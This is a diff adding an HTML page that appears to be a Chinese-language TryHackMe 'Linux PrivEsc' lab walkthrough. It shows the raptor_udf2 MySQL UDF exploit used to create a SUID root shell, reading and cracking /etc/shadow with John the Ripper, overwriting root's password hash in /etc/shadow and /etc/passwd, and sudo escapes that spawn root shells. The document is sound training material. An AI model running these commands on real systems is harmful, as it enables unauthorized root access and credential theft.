@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title> :: badwichell</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Linux PrivEsc-基础篇 各类Linux提权方法，持续更新。
+0x1 INFO 根据该靶场的介绍，会带我们进行各种​ Linux 权限提升技术​的学习
+0x2 靶机连接 我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数-oHostKeyAlgorithms=&#43;ssh-rsa​
+┌──(kali㉿kali)-[~] └─$ ssh user@10.10.134.160 -oHostKeyAlgorithms=&#43;ssh-rsa The authenticity of host &amp;#39;10.10.134.160 (10.10.134.160)&amp;#39; can&amp;#39;t be established. RSA key fingerprint is SHA256:JwwPVfqC&#43;8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yews Please type &amp;#39;yes&amp;#39;, &amp;#39;no&amp;#39; or the fingerprint: yes Warning: Permanently added &amp;#39;10.10.134.160&amp;#39; (RSA) to the list of known hosts. user@10.10.134.160&amp;#39;s password: Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Fri May 15 06:41:23 2020 from 192.168.1.125 此时已经连接上靶场，回答第一个问题。
+问题一：在部署连接过后运行“id”命令。结果是什么？ 此时我们按照提示在命令行中输入id即可获取答案
+0x2 服务利用 MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个流行的漏洞利用，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。
+使用cd /home/user/tools/mysql-udf​切换至该目录
+我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。
+​​
+使用以下命令编译 raptor_udf2.c 漏洞利用代码：
+gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 以 root 用户身份使用空白密码连接到 MySQL 服务：
+mysql -u root 在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：
+use mysql; create table foo(line blob); insert into foo values(load_file(&amp;#39;/home/user/tools/mysql-udf/raptor_udf2.so&amp;#39;)); select * from foo into dumpfile &amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;; create function do_system returns integer soname &amp;#39;raptor_udf2.so&amp;#39;; 使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：
+select do_system(&amp;#39;cp /bin/bash /tmp/rootbash; chmod &#43;xs /tmp/rootbash&amp;#39;); 退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：
+/tmp/rootbash -p 请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：
+rm /tmp/rootbash exit 0x3 弱文件权限 /etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
+请注意，VM 上的 /etc/shadow 文件是全局可读的：
+​ls -l /etc/shadow​
+查看/etc/shadow文件内容：
+​cat /etc/shadow​
+文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。
+将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：
+​john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt​
+┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status 自己去尝试一下吧 (root) 1g 0:00:00:04 0.11% (ETA: 10:59:33) 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably Session aborted 切换到root用户，使用破解的密码：
+​su root​
+还有一种方式，写入
+/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
+请注意，VM 上的 /etc/shadow 文件是全局可写的：
+​ls -l /etc/shadow​
+使用您选择的密码生成新密码哈希：
+​mkpasswd -m sha-512 “你的密码”​
+编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。
+切换到 root 用户，使用新密码：
+​su root​
+另一种同样利用方式
+/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。
+请注意，/etc/passwd 文件是全局可写的：
+​ls -l /etc/passwd​
+使用您选择的密码生成新密码哈希：
+​openssl passwd “你的新密码”​
+编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。
+user@debian:~$ openssl passwd open123456 Warning: truncating password to 8 characters P1kI55UCjXLJM 切换到 root 用户，使用新密码：
+​su root​
+或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .
+现在切换到 newroot 用户，使用新密码：
+​su newroot​
+0x4 shell转义序列 列出 sudo 允许您的用户运行的程序：
+​sudo -l​
+访问 GTFOBins ( https://gtfobins.github.io ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。
+从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell
+首先我们执行sudo -l查看
+user@debian:~$ sudo -l Matching Defaults entries for user on this host: env_reset, env_keep&#43;=LD_PRELOAD, env_keep&#43;=LD_LIBRARY_PATH User user may run the following commands on this host: (root) NOPASSWD: /usr/sbin/iftop (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nano (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/sbin/apache2 (root) NOPASSWD: /bin/more iftop ​​
+打开GTFOBins，搜索第一个iftop，任何按照说明
+首先sudo iftop进入iftop，在命令行输入!/bin/sh
+user@debian:~$ sudo iftop interface: eth0 IP address is: 10.10.134.160 MAC address is: 02:7a:ce:e8:51:93 sh-4.1# whoami root find user@debian:~$ sudo find . -exec /bin/sh \; -quit sh-4.1# whoami root nano ​
+运行 sudo /usr/bin/nano
+输入 Ctrl &#43; R 然后 Ctrl &#43; X
+输入 reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
+vim vim要简单一点
+user@debian:~$ sudo vim -c &amp;#39;:!/bin/sh&amp;#39; sh-4.1# ls 1 myvpn.ovpn tools sh-4.1# whoami root man user@debian:~$ sudo man man sh-4.1# whoami root 输入 sudo man man后输入! /bin/sh
+AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; sh-4.1# whoami root less user@debian:~$ sudo less /etc/profile sh-4.1# whoami root FTP user@debian:~$ sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# whoami root nmap user@debian:~$ sudo nmap --interactive Starting Nmap V. 5.00 ( http://nmap.org ) Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help nmap&amp;gt; ! sh sh-4.1# whoami root " />
+<meta name="keywords" content="web攻防,内网渗透,免杀,红队,redteam,tryhackme,hackthebox,信息安全" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="">
+<meta property="og:description" content="Linux PrivEsc-基础篇 各类Linux提权方法，持续更新。
+0x1 INFO 根据该靶场的介绍，会带我们进行各种​ Linux 权限提升技术​的学习
+0x2 靶机连接 我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数-oHostKeyAlgorithms=&#43;ssh-rsa​
+┌──(kali㉿kali)-[~] └─$ ssh user@10.10.134.160 -oHostKeyAlgorithms=&#43;ssh-rsa The authenticity of host &amp;#39;10.10.134.160 (10.10.134.160)&amp;#39; can&amp;#39;t be established. RSA key fingerprint is SHA256:JwwPVfqC&#43;8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yews Please type &amp;#39;yes&amp;#39;, &amp;#39;no&amp;#39; or the fingerprint: yes Warning: Permanently added &amp;#39;10.10.134.160&amp;#39; (RSA) to the list of known hosts. user@10.10.134.160&amp;#39;s password: Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Fri May 15 06:41:23 2020 from 192.168.1.125 此时已经连接上靶场，回答第一个问题。
+问题一：在部署连接过后运行“id”命令。结果是什么？ 此时我们按照提示在命令行中输入id即可获取答案
+0x2 服务利用 MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个流行的漏洞利用，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。
+使用cd /home/user/tools/mysql-udf​切换至该目录
+我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。
+​​
+使用以下命令编译 raptor_udf2.c 漏洞利用代码：
+gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 以 root 用户身份使用空白密码连接到 MySQL 服务：
+mysql -u root 在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：
+use mysql; create table foo(line blob); insert into foo values(load_file(&amp;#39;/home/user/tools/mysql-udf/raptor_udf2.so&amp;#39;)); select * from foo into dumpfile &amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;; create function do_system returns integer soname &amp;#39;raptor_udf2.so&amp;#39;; 使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：
+select do_system(&amp;#39;cp /bin/bash /tmp/rootbash; chmod &#43;xs /tmp/rootbash&amp;#39;); 退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：
+/tmp/rootbash -p 请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：
+rm /tmp/rootbash exit 0x3 弱文件权限 /etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
+请注意，VM 上的 /etc/shadow 文件是全局可读的：
+​ls -l /etc/shadow​
+查看/etc/shadow文件内容：
+​cat /etc/shadow​
+文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。
+将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：
+​john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt​
+┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status 自己去尝试一下吧 (root) 1g 0:00:00:04 0.11% (ETA: 10:59:33) 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably Session aborted 切换到root用户，使用破解的密码：
+​su root​
+还有一种方式，写入
+/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
+请注意，VM 上的 /etc/shadow 文件是全局可写的：
+​ls -l /etc/shadow​
+使用您选择的密码生成新密码哈希：
+​mkpasswd -m sha-512 “你的密码”​
+编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。
+切换到 root 用户，使用新密码：
+​su root​
+另一种同样利用方式
+/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。
+请注意，/etc/passwd 文件是全局可写的：
+​ls -l /etc/passwd​
+使用您选择的密码生成新密码哈希：
+​openssl passwd “你的新密码”​
+编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。
+user@debian:~$ openssl passwd open123456 Warning: truncating password to 8 characters P1kI55UCjXLJM 切换到 root 用户，使用新密码：
+​su root​
+或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .
+现在切换到 newroot 用户，使用新密码：
+​su newroot​
+0x4 shell转义序列 列出 sudo 允许您的用户运行的程序：
+​sudo -l​
+访问 GTFOBins ( https://gtfobins.github.io ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。
+从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell
+首先我们执行sudo -l查看
+user@debian:~$ sudo -l Matching Defaults entries for user on this host: env_reset, env_keep&#43;=LD_PRELOAD, env_keep&#43;=LD_LIBRARY_PATH User user may run the following commands on this host: (root) NOPASSWD: /usr/sbin/iftop (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nano (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/sbin/apache2 (root) NOPASSWD: /bin/more iftop ​​
+打开GTFOBins，搜索第一个iftop，任何按照说明
+首先sudo iftop进入iftop，在命令行输入!/bin/sh
+user@debian:~$ sudo iftop interface: eth0 IP address is: 10.10.134.160 MAC address is: 02:7a:ce:e8:51:93 sh-4.1# whoami root find user@debian:~$ sudo find . -exec /bin/sh \; -quit sh-4.1# whoami root nano ​
+运行 sudo /usr/bin/nano
+输入 Ctrl &#43; R 然后 Ctrl &#43; X
+输入 reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
+vim vim要简单一点
+user@debian:~$ sudo vim -c &amp;#39;:!/bin/sh&amp;#39; sh-4.1# ls 1 myvpn.ovpn tools sh-4.1# whoami root man user@debian:~$ sudo man man sh-4.1# whoami root 输入 sudo man man后输入! /bin/sh
+AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; sh-4.1# whoami root less user@debian:~$ sudo less /etc/profile sh-4.1# whoami root FTP user@debian:~$ sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# whoami root nmap user@debian:~$ sudo nmap --interactive Starting Nmap V. 5.00 ( http://nmap.org ) Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help nmap&amp;gt; ! sh sh-4.1# whoami root " />
+<meta property="og:url" content="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/" />
+<meta property="og:site_name" content="badwichell" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    badwichell
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/attck">ATT&amp;CK</a></li>
+        
+      
+        
+          <li><a href="/tools">tools</a></li>
+        
+      
+        
+          <li><a href="/tryhackme">tryhackme</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/attck">ATT&amp;CK</a></li>
+        
+      
+        
+          <li><a href="/tools">tools</a></li>
+        
+      
+        
+          <li><a href="/tryhackme">tryhackme</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/"></a>
+  </h1>
+  <div class="post-meta">
+    
+    
+    
+      <span class="post-reading-time">:: 12 min read (2464 words)</span>
+    
+  </div>
+
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#iftop">iftop</a></li>
+        <li><a href="#find">find</a></li>
+        <li><a href="#nano">nano</a></li>
+        <li><a href="#vim">vim</a></li>
+        <li><a href="#man">man</a></li>
+        <li><a href="#awk">AWK</a></li>
+        <li><a href="#less">less</a></li>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#nmap">nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#heading"></a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#第二cron-path环境变量">第二cron-PATH环境变量</a></li>
+    <li><a href="#cron-job-通配符">cron job-通配符</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#suid--sgid-可执行文件---共享对象注入">SUID / SGID 可执行文件 - 共享对象注入</a></li>
+    <li><a href="#suid--sgid-可执行文件---环境变量">SUID / SGID 可执行文件 - 环境变量</a></li>
+    <li><a href="#suidsgid-可执行文件滥用-shell-特性1">SUID/SGID 可执行文件——滥用 Shell 特性（#1）</a></li>
+    <li><a href="#suid--sgid-可执行文件滥用-shell-特性2">SUID / SGID 可执行文件——滥用 Shell 特性（#2）</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="linux-privesc-基础篇">Linux PrivEsc-基础篇<a href="#linux-privesc-基础篇" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>各类Linux提权方法，持续更新。</p>
+</blockquote>
+<h1 id="0x1-info">0x1 INFO<a href="#0x1-info" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>根据该靶场的介绍，会带我们进行各种<code>​ Linux 权限提升技术</code>​的学习</p>
+<h1 id="0x2-靶机连接">0x2 靶机连接<a href="#0x2-靶机连接" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数<code>-oHostKeyAlgorithms=+ssh-rsa</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh user@10.10.134.160 -oHostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.134.160 (10.10.134.160)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yews
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Please type &#39;</span>yes<span style="color:#e6db74">&#39;, &#39;</span>no<span style="color:#e6db74">&#39; or the fingerprint: yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.134.160<span style="color:#e6db74">&#39; (RSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">user@10.10.134.160&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux debian 2.6.32-5-amd64 <span style="color:#75715e">#1 SMP Tue May 13 16:34:35 UTC 2014 x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri May <span style="color:#ae81ff">15</span> 06:41:23 <span style="color:#ae81ff">2020</span> from 192.168.1.125
+</span></span></code></pre></div><p>此时已经连接上靶场，回答第一个问题。</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> <strong>问题一</strong>：在部署连接过后运行“id”命令。结果是什么？</li>
+</ul>
+<p>此时我们按照提示在命令行中输入id即可获取答案</p>
+<h1 id="0x2-服务利用">0x2 服务利用<a href="#0x2-服务利用" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个<a href="https://www.exploit-db.com/exploits/1518">流行的漏洞利用</a>，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。</p>
+</blockquote>
+<p>使用<code>cd /home/user/tools/mysql-udf</code>​切换至该目录</p>
+<p>我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。</p>
+<p>​<img src="https://s2.loli.net/2022/12/16/ZBzkMINwDb1ECrp.png" alt="">​</p>
+<p>使用以下命令编译 raptor_udf2.c 漏洞利用代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -g -c raptor_udf2.c -fPIC
+</span></span><span style="display:flex;"><span>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span></code></pre></div><p>以 root 用户身份使用空白密码连接到 MySQL 服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u root
+</span></span></code></pre></div><p>在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use mysql;
+</span></span><span style="display:flex;"><span>create table foo<span style="color:#f92672">(</span>line blob<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>insert into foo values<span style="color:#f92672">(</span>load_file<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;</span><span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> * from foo into dumpfile <span style="color:#e6db74">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span>;
+</span></span><span style="display:flex;"><span>create <span style="color:#66d9ef">function</span> do_system returns integer soname <span style="color:#e6db74">&#39;raptor_udf2.so&#39;</span>;
+</span></span></code></pre></div><p>使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> do_system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;</span><span style="color:#f92672">)</span>;
+</span></span></code></pre></div><p>退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/rootbash -p
+</span></span></code></pre></div><p>请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /tmp/rootbash
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><h1 id="0x3-弱文件权限">0x3 弱文件权限<a href="#0x3-弱文件权限" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。</p>
+<p>请注意，VM 上的 /etc/shadow 文件是全局可读的：</p>
+<p>​<code>ls -l /etc/shadow</code>​</p>
+<p>查看/etc/shadow文件内容：</p>
+<p>​<code>cat /etc/shadow</code>​</p>
+<p>文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。</p>
+<p>将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：</p>
+<p>​<code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>自己去尝试一下吧      <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>   
+</span></span><span style="display:flex;"><span>1g 0:00:00:04 0.11% <span style="color:#f92672">(</span>ETA: 10:59:33<span style="color:#f92672">)</span> 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session aborted
+</span></span></code></pre></div><p>切换到root用户，使用破解的密码：</p>
+<p>​<code>su root</code>​</p>
+<p>还有一种方式，写入</p>
